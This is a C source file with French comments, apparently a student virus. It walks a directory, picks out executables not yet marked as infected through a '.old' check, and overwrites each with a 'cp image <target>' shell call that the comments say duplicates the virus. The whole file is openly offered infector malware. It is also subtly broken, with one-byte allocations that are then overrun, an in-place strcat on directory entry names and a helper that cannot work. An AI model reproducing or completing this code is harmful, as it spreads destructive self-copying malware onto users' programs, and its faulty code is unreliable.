/*
ce fichier contient toutes verifications, infectations et duplications sur les fichier executables afin de tester
 si un fichier est de l'extension "old" , tester s'il est deja infecter ou non .
*/


int verifier_cible_A(struct dirent* fichierLu) //verifier si le fichier a l'extention .old
{
  if(strstr(fichierLu->d_name,".old") !=NULL ) // strstr cherche si la chaine .old se trouve dans le nom du ficher 
  {
    return 0;//return 0 si .old se trouve dans le nom du fichier 
  }
  else
    return 1;// sinon retourn 1
  }


int verifier_cible_B(struct dirent* fichierLu)
	{
		  char *nom_fichier;
		  nom_fichier = (char*)malloc(sizeof(char));
		  strcat(fichierLu->d_name,".old"); // ajout d'extension .old à notre fichier
		  FILE *f=NULL;
		    f =fopen(fichierLu->d_name,"r");
		  if(f != NULL)//tester si le fichier n'est pas vide 
		    {
		      fclose(f);
		      return 0;// si oui on retourne 0
		    }
		  else

		      return 1;// sinon on retourne 1
	}






//Fonction qui prend le nomdu fichier cible et le renome

char *name_file_contain_old(char *d){

	char *c;
	c=(char*)malloc(sizeof(char)); // on reserve la memoire	
	int i ;	 
	for(i = 0 ; d[i] != '\0' && d[i] !='.' ; i++ ) // on prend le nom du fichier sans l'extension
	 	{
			 c[i] = d[i]; 
		}
	// c= strcat (c, ".old"); // on rajoute '.old' à notre nouveau fichier 

	c="";int j=0;
	while( d[i] != '\0')
		{
			 c[j] = d[i]; 
			j++;c++;
		}
	
	// printf("le nome de nouveau fichier est : %s",c);
	
	return c;
}


/* Fonction qui copie le contenue du fichier 
   cible vers le fichier qu'on a renomer */

void infecter (struct dirent *fichier)
{

char copy[50]="cp ";
strcat(copy,"image");
strcat(copy," ");
strcat(copy,fichier->d_name);
system(copy);//execution de la commande qui dupliquer le virus ( copie du code du fichier en cours dans le fichier cible)


}







int openDirectory(char *repertoire)
{
	DIR* rep = NULL;
	rep = opendir(repertoire);

        if (rep == NULL) 
           exit(1);   
	
        struct dirent* fichierLu = NULL;
	struct stat status;
	char *ret;
		ret = (char*)malloc(sizeof(char));

	// this is whene magic happens !
        while ((fichierLu = readdir(rep)) != NULL)
		
		{		
			 stat(fichierLu->d_name,&status) ;
			       if(status.st_mode & S_IXUSR && status.st_mode & S_IFREG) // si le fichier est un fichier executable 
				{  

				    if(verifier_cible_A(fichierLu)==1 && verifier_cible_B(fichierLu)==1) // le fichier n'ete jamais infecter 
					    { 
						infecter(fichierLu);
					    }
				}

		}
	
    if (closedir(rep) == -1) // S'il y a eu un souci avec la fermeture

        exit(-1);
    return 0;
}






